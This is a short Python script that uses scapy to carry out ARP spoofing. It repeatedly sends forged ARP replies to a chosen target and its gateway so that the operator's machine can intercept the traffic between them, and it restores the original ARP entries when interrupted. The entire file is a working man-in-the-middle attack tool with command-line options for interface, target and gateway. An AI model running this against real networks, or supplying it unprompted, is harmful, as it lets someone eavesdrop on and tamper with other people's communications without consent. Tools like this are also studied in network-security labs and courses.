#!/usr/bin/python3
import scapy.all as scapy
import time
import sys
import argparse


sendpackets=0



def parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i","--interface",dest="interface",help="Interface to sniff data from, like wlan0 or eth0")
    parser.add_argument("-t","--target",dest="target_ip",help="The Target You Want to Sniff Data From")
    parser.add_argument("-g","--gateway",dest="gateway_ip",help="Ip of your gateway of your rauter like 192.168.1.254 or 192.168.1.1")
    value = parser.parse_args()
    if value.interface==None or value.target_ip==None or value.gateway_ip==None:
        print("Please specify all the required parameters properly, use --help for help")
        exit(1)
    return value.target_ip ,value.gateway_ip, value.interface
    pass


def restore(destip,sourceip):
    destmac = getmac(destip)
    sourcemac = getmac(sourceip)
    respacket = scapy.ARP(op=2,pdst=destip,hwdst=destmac,psrc=sourceip,hwsrc=sourcemac)
    scapy.send(respacket,verbose=0,count=4)


def getmac(ip): #scapy.arping()>> using scapy to find devices in the netmask
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcastReq = broadcast/arpRequest
    answered_list, unanswered_list = scapy.srp(broadcastReq,timeout=0.5,verbose=0)
    return answered_list[0][1].hwsrc
    # print(answered_list[0][1].hws)
    # answered_list ma for loop use gagrera hwsrc, nikalnu paryo

def spoof(targetip,spoofip):
    targetmac = getmac(targetip)
    packet = scapy.ARP(op=2,pdst=targetip,hwdst=targetmac,psrc=spoofip)
    scapy.send(packet,verbose=0)


target_ip, gateway_ip, interface = parser()


try:
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sendpackets = sendpackets +2
        print(" \r [+] Sent:: "+str(sendpackets),end="")
        time.sleep(1)
except KeyboardInterrupt :
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)
    print("\n[x] Detected CTRL + C, Establishig Original Connection...")
except IndexError:
    print(" \n[x]The Device you are trying to spoof is currently offline, \n try again or ask @A5H to shorten the send time")

